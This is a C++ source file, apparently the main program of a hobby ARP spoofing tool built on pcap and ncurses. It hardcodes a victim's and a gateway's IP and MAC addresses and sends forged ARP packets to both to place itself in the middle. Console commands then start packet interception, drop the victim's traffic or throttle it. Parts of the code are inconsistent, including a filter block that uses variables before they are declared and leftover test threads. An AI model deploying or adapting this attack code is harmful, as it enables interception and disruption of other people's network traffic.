#include "arp_spoofer_lib/headers/AdapterQuery.h"
#include "arp_spoofer_lib/headers/net_structure.h"
#include "arp_spoofer_lib/headers/ARPSpoofing.h"
#include "arp_spoofer_lib/headers/PacketHandler.h"

#include <thread>
#include <string>
#include <list>
#include <atomic>
#include <ncurses.h>
#include <cstdio>
#include <getopt.h>

using std::thread;
using std::list;
using std::atomic_bool;
using std::fopen, std::fscanf;

const short STATUS_COLOR_PAIR = 1;

int main() {
    extern char *optarg;
    extern int optind;
    int opt;

    static char usage[] = "Usage: ARP_Spoofer [-I <interface name>] [-M <target MAC>] [-N <target ip>]";

    int a = 0;
    atomic_bool flag(false);

    concurrent_queue<string> thread_output(100);

    auto producer_f = [&](int idx) {
        int i = 0;
        while (!a) {
            thread_output.push_back(std::to_string(i++));
            flag = true;
//            cout << "[producer " << idx << " ]: " << i++ << endl;
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
    };

//    auto consumer_f = [&](int idx) {
//        int i;
//        while (!a) {
//            i = thread_output.pop_front();
//            cout << "[consumer " << idx << " ]: " << i << endl;
//            std::this_thread::sleep_for(std::chrono::milliseconds(100));
//        }
//    };

    thread p1_t(producer_f, 1);
//    thread p2_t(producer_f, 2);
//    thread c1_t(consumer_f, 1);
//    thread c2_t(consumer_f, 2);



#ifdef BPF_FILTER
    char filter_buf[PCAP_ERRBUF_SIZE];
    bpf_program bpf;
    sprintf(filter_buf, "ether host %02x:%02x:%02x:%02x:%02x:%02x",
            EXPAND_MAC(target_mac));

#ifdef DEBUG
    printf("filter buf: %s\n", filter_buf);
#endif

    // compile bpf filter
    if (pcap_compile(adapter, &bpf, filter_buf,
                     1, PCAP_NETMASK_UNKNOWN) < 0) {
        pcap_perror(adapter, "Error occurred when "
                             "compiling BPF filter");
        pcap_close(adapter);
        return -1;
    }

    // set bpf filter on adapter
    if (pcap_setfilter(adapter, &bpf) < 0) {
        pcap_perror(adapter, "Error occurred when "
                             "setting BPF filter");
        pcap_close(adapter);
        return -1;
    }
#endif

#define PACKET_CAPTURE
#ifdef PACKET_CAPTURE
    u_char target_ip[4] = IP_ARRAY(192, 168, 43, 171);
    u_char target_mac[6] = MAC_ARRAY(9c, b6, d0, b9, 1a, 0f);

    u_char gateway_ip[4] = IP_ARRAY(192, 168, 43, 1);
    u_char gateway_mac[6] = MAC_ARRAY(22, 47, da, 58, 88, 8c);

    u_char self_ip[4] = IP_ARRAY(192, 168, 43, 215);
    u_char self_mac[6] = MAC_ARRAY(58, 91, CF, 98, 7B, FF);

    u_char broadcast_ip[4] = IP_ARRAY(0, 0, 0, 0);
    u_char broadcast_mac[6] = MAC_ARRAY(FF, FF, FF, FF, FF, FF);

    printf("sizeof(arp_packet): %lu\n", sizeof(arp_packet));

    // Let user select the network interface used to capture packets
    string dev_name = list_dev_and_choose_dev();

    // Acquire the IP and MAC of current gateway


    pcap_t *adapter = open_adapter(dev_name);

    arp_packet *spoofing_target_packet = arp_packet_constructor(gateway_ip, self_mac,
                                                                target_ip, target_mac);
    ARP_packet_sender target_spoofer(adapter, spoofing_target_packet, 10);

    arp_packet *spoofing_gateway_packet = arp_packet_constructor(target_ip, self_mac,
                                                                 gateway_ip, gateway_mac);
    ARP_packet_sender gateway_spoofer(adapter, spoofing_gateway_packet, 1000);

    // TODO: Add ARP recovering

    PacketHandler pkt_h(adapter, self_mac,
                        target_mac, gateway_mac,
                        target_ip, std::ref(thread_output));

#define NOTEST
#ifdef NOTEST
    list<string> output_buf;
    initscr();
    use_default_colors();
//    newterm(nullptr, stderr, stdin);
//    scrollok(stdscr, true);
//    nocbreak();
    noecho();
    timeout(100);
    curs_set(0);
    keypad(stdscr, true);

    if (!has_colors()) {
        endwin();
        printf("The terminal does not support color!\n");
        _exit(-1);
    }
    start_color();
    init_pair(STATUS_COLOR_PAIR, COLOR_BLACK, COLOR_GREEN);

    int winx, winy, curx, cury;
    const int BUF_SIZE = 100;
    string cmd_buf;
    int ch;

    while ((ch = getch()) != 'q') {
        if (ch == KEY_BACKSPACE) {
            if (!cmd_buf.empty())
                cmd_buf.pop_back();
        } else if (isgraph(ch) || isspace(ch))
            cmd_buf += char(ch);

        if (thread_output.empty())
            continue;

//        while (!thread_output.empty()) {
        output_buf.push_front(thread_output.pop_front());
        if (output_buf.size() > BUF_SIZE)
            output_buf.pop_back();
//        }

        getmaxyx(stdscr, winy, winx);

        if (output_buf.empty())
            continue;

        erase();
        auto iter = output_buf.begin();
        for (int now_y = std::min((unsigned long) (LINES - 2), output_buf.size() - 1); now_y >= 0; now_y--) {
            mvprintw(now_y, 0, "%s", (iter++)->c_str());
        }

        attron(COLOR_PAIR(STATUS_COLOR_PAIR));
        mvprintw(LINES - 1, 0, "%s", cmd_buf.c_str());
        getyx(stdscr, cury, curx);
        printw("%*c", winx - curx, ' ');
        attroff(COLOR_PAIR(STATUS_COLOR_PAIR));
        flag = false;
    }
//    refresh();

//    for (int i = 0; i <= 10; i++)
//        printw("#%d This is a Test!\n", i);
//    getch();
//    scroll(stdscr);
    endwin();

    p1_t.join();
//    p2_t.join();
//    c1_t.join();
//    c2_t.join();
#endif
    char input[256];
    string cmd;
    while (scanf("%s", input) != EOF) {
        cmd = input;
        if (cmd == "so") {
            target_spoofer.start();
            gateway_spoofer.start();
        } else if (cmd == "sf") {
            target_spoofer.stop();
            gateway_spoofer.stop();
        } else if (cmd == "ex") {
            target_spoofer.stop();
            gateway_spoofer.stop();
            pkt_h.stop();
            pkt_h.stop();
            pcap_close(adapter);
            return 0;
        } else if (cmd == "po")
            pkt_h.start();
        else if (cmd == "pf")
            pkt_h.stop();
        else if (cmd == "do")
            pkt_h.set_drop_packet(true);
        else if (cmd == "df")
            pkt_h.set_drop_packet(false);
        else if (cmd[0] == 'r') {
            int rate_kBps = std::stoi(cmd.substr(1, std::string::npos));
            pkt_h.set_rate_limit_kBps(rate_kBps);
        }
    }
#endif
    return 0;
}
